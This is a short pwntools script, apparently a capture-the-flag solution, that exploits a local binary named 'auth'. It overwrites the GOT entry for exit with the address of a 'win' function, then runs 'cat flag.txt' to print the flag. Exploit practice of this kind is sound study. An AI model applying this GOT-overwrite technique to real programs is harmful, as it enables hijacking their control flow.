from pwn import *

context.binary = "./auth"
p = process()

p.sendline(hex(context.binary.got["exit"]).encode("ascii"))
p.sendline(hex(context.binary.functions["win"].address).encode("ascii"))
p.sendline(b"cat flag.txt")
log.success(p.recvline_regex(rb".*{.*}.*").decode("ascii"))
